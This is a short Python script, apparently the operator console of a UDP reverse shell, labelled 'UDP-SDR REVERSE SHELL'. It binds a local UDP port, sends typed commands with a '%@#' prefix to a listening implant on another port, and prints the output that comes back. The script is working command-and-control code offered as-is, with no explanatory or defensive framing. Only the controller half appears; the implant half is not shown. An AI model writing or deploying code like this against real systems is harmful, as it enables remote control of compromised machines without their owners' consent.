import socket
import threading
import os

UDP_IP="127.0.0.1"
UDP_PORT=8888
UDP_PORT_SOURCE=7777

sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM )
sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
sock.bind((UDP_IP,UDP_PORT))

print("\t\t\t====>  UDP-SDR REVERSE SHELL  <=====")
print("==============================================")

print("\nType 'quit' to exit.")
print()

def send():
    while True:
        ms = input()
        if ms == "quit":
            os._exit(1)
        sock.sendto(("%@#"+ms).encode() , (UDP_IP,UDP_PORT_SOURCE))

def rec():
    while True:
        msg = sock.recvfrom(1024)
        print((msg[0].decode())[3:])
        print()

x1 = threading.Thread( target = send )
x2 = threading.Thread( target = rec )

x1.start()
x2.start()